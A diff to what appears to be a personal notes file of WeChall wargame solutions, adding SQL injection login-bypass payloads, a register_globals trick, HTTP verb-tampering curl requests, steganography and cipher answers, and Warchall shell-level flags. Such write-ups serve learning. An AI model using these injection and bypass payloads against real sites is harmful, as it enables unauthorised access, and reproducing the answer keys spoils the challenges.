@@ -241,7 +241,7 @@ key is between 26 and 128
 ```py
 import sys
 
-hexCipher = """ #random
+hexCipher = """
 11 39 39 2E 20 34 39 2C 76 20 43 39 3F 20 3D 39
 36 40 2F 2E 20 39 38 2F 20 37 39 3C 2F 20 2D 32
 2B 36 36 2F 38 31 2F 20 33 38 20 43 39 3F 3C 20
@@ -317,3 +317,166 @@ Tool: https://quipqiup.com/
 ```
 croeligsbsss
 ```
+
+
+### Training: MySQL I (MySQL, Exploit, Training)
+```php
+$username = Common::getPostString('username');
+$password = Common::getPostString('password', false);
+...
+$password = md5($password);
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+...
+```
+
+```
+username=admin'or'1'='1
+username=admin' --
+```
+
+
+### Training: MySQL II (MySQL, Exploit, Training)
+```php
+    $query = "SELECT * FROM users WHERE username='$username'";
+    if (false === ($result = $db->queryFirst($query))) {
+		return false;
+	}
+	### This is the new check ###
+	if ($result['password'] !== $password) {
+		return false;
+	} #  End of the new code  ###
+```
+
+md5(NULL) = d41d8cd98f00b204e9800998ecf8427e
+
+```
+username=1' union select 1,'admin','d41d8cd98f00b204e9800998ecf8427e&password=
+```
+
+
+### Training: WWW-Basics (HTTP, Training)
+Server:
+python: BaseHTTPServer
+
+```nc
+while true; do (echo -e 'HTTP/1.1 200 OK\r\n'; echo -e "My name is Ranger and iChall.\c") | nc -l localhost 6666; done
+```
+
+Client:
+python: requests
+```curl
+curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" http://www.wechall.net/login
+
+curl -b cookie.file -c cookie.file -X POST -d "port=80&go=" http://www.wechall.net/challenge/training/www/basic/index.php
+```
+
+### Training: Register Globals (Exploit, PHP, Training)
+```html
+if (isset($login))
+{
+    ...
+    if (strtolower($login[0]) === 'admin') {
+```
+
+```
+...&login[0]=admin
+```
+
+
+### Training: Math Pyramid (Math, Training)
+h = 1 / sqrt(2) * a
+V = 1 / 3 * a ^ 2 * h = sqrt(2)/6*a^3
+```
+a^3/18^.5
+```
+
+
+### Training: Baconian (Stegano, Encoding, Crypto, Training)
+https://en.wikipedia.org/wiki/Bacon%27s_cipher
+
+http://rumkin.com/tools/cipher/baconian.php
+
+very well done fellow hacker the secret keyword is bcgflbnebllh
+
+```
+bcgflbnebllh
+```
+
+
+### Training: LSB (Stegano, Image, Training)
+Tool: Stegsolve (Green Plane 1)
+
+http://www.caesum.com/handbook/Stegsolve.jar
+
+```
+HMRDMMIDHIHN
+```
+
+
+### Training: GPG (Crypto, Training)
+Gmail -> FlowCrypt (extension)
+
+
+### Limited Access (Exploit, HTTP)
+Limit GET, but not POST!
+
+```
+curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" http://www.wechall.net/login
+
+curl -b cookie.file -c cookie.file -X POST http://www.wechall.net/challenge/wannabe7331/limited_access/protected/protected.php
+```
+
+
+### Limited Access Too (Exploit, HTTP)
+Limit GET POST HEAD PUT DELETE CONNECT OPTIONS, but not VIEW!
+
+curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" http://www.wechall.net/login
+
+curl -b cookie.file -c cookie.file -X VIEW http://www.wechall.net/challenge/wannabe7331/limited_access_too/protected/protected.php
+```
+
+
+### Shadowlamb - Chapter I (Fun)
+### Shadowlamb - Chapter II (Fun)
+### Shadowlamb - Chapter III (Fun)
+### Shadowlamb - Chapter IV (Fun, Stegano)
+Play the IRC mmorpg game...
+
+Chrome - CIRC extension
+
+Try this source: https://github.com/gizmore/gwf3/blob/9a73e95c9d80b9482e88c69009c7a8c651860a4d/www/challenge/lamb/shadowlamb1/WC5Lamb_Solution.php
+
+But LAMB_PASSWORD2 is UNKNOWN ...
+
+
+### Training: Warchall - The Beginning (Realistic, Linux, Shell, Warchall)
+Enable logfile EMails -> (RE)SET your SSH account -> ssh -p 19198 ranger@warchall.net
+
+```bash
+#Solution0
+cat /home/level/0/README.txt
+
+#Solution1
+ls -R /home/level/1
+/home/level/1/blue/pill/hats/gray/solution/is/SOLUTION.txt
+
+#Solution2
+cat /home/level/2/.porb/.solution
+
+#Solution3
+cat /home/level/3/.bash_history
+
+#Solution4
+chmod 777 /home/user/ranger/level/4/README.txt
+cat /home/user/ranger/level/4/README.txt
+
+#Solution5
+chmod 700 /home/user/ranger/level
+cat /home/user/ranger/level/5/solution.txt
+```
+
+```
+bitwarrior,LameStartup,HiddenIsConfig,RepeatingHistory,AndIknowchown,OhRightThePerms
+```
+
+
